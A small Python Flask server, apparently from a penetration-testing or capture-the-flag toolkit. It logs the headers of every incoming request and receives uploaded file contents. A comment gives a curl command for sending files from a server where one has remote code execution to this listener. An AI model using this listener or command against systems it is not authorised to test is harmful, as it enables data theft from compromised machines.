from flask import Flask
from flask import render_template
from flask import redirect
from flask import url_for
from flask import request, session, flash, send_file
from flask import make_response # for setting cookies
import flask
import os
import subprocess
import ipdb
import datetime

app = Flask(__name__)

##########
# Routes #
##########

# If you have RCE on a server, you can upload a file to this endpoint with:
#   curl -X POST -d @path/to/filename.txt this_servers_ip:port/file
@app.route("/file", methods=["POST"])
def file():
    print()
    log_meta_info(request)
    print()
    print("File content:")
    print("-----------------------")
    for x in request.form.keys():
        print(x)
    print("-----------------------")

    return "OK"

# Thanks: http://flask.pocoo.org/snippets/57/
@app.route("/", defaults={'path':''})
@app.route('/<path:path>')
def index(path):
    log_meta_info(request)
    print("Visited: %s" % path)
    return "OK"

def log_meta_info(request):
    print("[*] %s - %s - From: %s" % (datetime.datetime.now(), request.method, request.remote_addr) )
    for header, value in request.headers.to_wsgi_list():
        print("  %s: %s" % (header, value))

#################
# Server config #
#################

app.secret_key = "blah-doesn't-matter"

APP_ROOT = os.path.dirname(os.path.abspath(__file__))

if __name__ == "__main__":
    app.debug = True
    app.run()
